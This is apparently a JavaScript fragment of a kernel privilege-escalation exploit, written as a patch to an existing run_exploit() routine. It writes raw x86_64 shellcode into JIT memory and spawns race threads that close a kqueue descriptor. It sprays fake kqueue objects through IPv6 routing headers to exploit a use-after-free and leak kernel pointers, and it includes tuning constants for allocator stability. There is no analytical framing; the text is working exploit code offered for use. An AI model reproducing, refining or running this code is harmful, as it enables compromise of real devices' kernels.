// ──────────────────────────────────────────────────────────────
// Stable one-shot race thread
// Replaces the infinite close(fd) loop.
// ──────────────────────────────────────────────────────────────
function create_race_thread(fd) {
    // x86_64:
    // mov edi, fd
    // mov eax, 6        ; sys_close
    // syscall
    // ret
    const code = new Uint8Array([
        0xBF, fd & 0xFF, (fd >> 8) & 0xFF, (fd >> 16) & 0xFF, (fd >> 24) & 0xFF,
        0xB8, 0x06, 0x00, 0x00, 0x00,
        0x0F, 0x05,
        0xC3
    ]);

    const rw = malloc(code.length);
    for (let i = 0; i < code.length; i++) {
        write8(rw.add(i), code[i]);
    }

    const shm = jitshm_create(0, code.length, 0x7);
    const exec = mmap(0, code.length, 0x7, 0x11, shm, 0);

    for (let i = 0; i < code.length; i++) {
        write8(exec.add(i), code[i]);
    }

    const args = malloc(0x68);
    for (let i = 0; i < 0x68; i++) write8(args.add(i), 0);

    write64(args.add(0x00), exec);          // start_func
    write64(args.add(0x08), 0);            // arg
    write64(args.add(0x10), malloc(0x1000));
    write64(args.add(0x18), 0x1000);
    write64(args.add(0x20), malloc(0x40));
    write64(args.add(0x28), 0x40);

    const tid = malloc(8);
    write64(args.add(0x30), tid);
    write64(args.add(0x38), malloc(8));

    const ret = thr_new(args, 0x68);
    if (!ret.eq(0)) {
        throw new Error("thr_new failed");
    }

    return read64(tid);
}

// ──────────────────────────────────────────────────────────────
// Tuned constants for better allocator stability
// ──────────────────────────────────────────────────────────────
const KQ_SIZE     = 264;
const SPRAY_COUNT = 64;   // reduced from 400
const IPV6_COUNT  = 96;

// ──────────────────────────────────────────────────────────────
// Stable fake kqueue prefix spray
// Preserves all kernel pointers except marker field.
// ──────────────────────────────────────────────────────────────
function spray_fake_kq_prefix() {
    const magic = 0x1337;
    const template = malloc(KQ_SIZE);
    const partial  = malloc(0x40);

    // Read one valid sprayed object as template.
    // This assumes free_rthdrs() leaves one object available.
    get_rthdr(ipv6_socks[0], template, KQ_SIZE);

    // Preserve first 0x40 bytes.
    for (let i = 0; i < 0x40; i++) {
        write8(partial.add(i), read8(template.add(i)));
    }

    // Patch only marker field.
    write64(partial.add(0x38), magic);

    const rhBuf = malloc(0x40);
    for (let i = 0; i < 0x40; i++) {
        write8(rhBuf.add(i), read8(partial.add(i)));
    }

    const len = ((0x40 >> 3) - 1) & ~1;

    write8(rhBuf.add(0), 0);
    write8(rhBuf.add(1), len);
    write8(rhBuf.add(2), 0);
    write8(rhBuf.add(3), len >> 1);

    free_rthdrs(ipv6_socks);

    for (const sock of ipv6_socks) {
        set_rthdr(sock, rhBuf, 0x40);
    }
}

// ──────────────────────────────────────────────────────────────
// Improved first-stage leak
// ──────────────────────────────────────────────────────────────
function first_uaf_leak() {
    log("[*] First UAF: leaking kq_fdp and kl_lock...");

    const kq = kqueue();
    if (kq.eq(-1)) {
        throw new Error("kqueue failed");
    }

    const fd1 = Number(kq.lo);
    const fd2 = Number(dup(kq).lo);

    if (fd2 < 0) {
        throw new Error("dup failed");
    }

    // Moderate allocator churn
    const spray = [];
    for (let i = 0; i < SPRAY_COUNT; i++) {
        const fd = kqueue();
        if (!fd.eq(-1)) {
            spray.push(Number(fd.lo));
        }
    }

    // One-shot race threads
    create_race_thread(fd1);
    create_race_thread(fd2);

    // Small timing window
    sched_yield();

    // Refill freed zone with minimally modified object
    spray_fake_kq_prefix();

    // Search for marker and leak pointers
    if (!leak_kq_info()) {
        throw new Error("Failed to leak kqueue pointers");
    }

    // Cleanup sprayed descriptors
    for (const fd of spray) {
        try {
            close(BigInt(fd));
        } catch (e) {}
    }

    log("[+] First UAF leak successful");
}

// ──────────────────────────────────────────────────────────────
// Replace in run_exploit()
// ──────────────────────────────────────────────────────────────

// OLD:
// log("[*] First UAF: leaking...");
// const kq1 = kqueue(); ...
// spray_fake_kq_prefix();
// if (!leak_kq_info()) ...

// NEW:
first_uaf_leak();
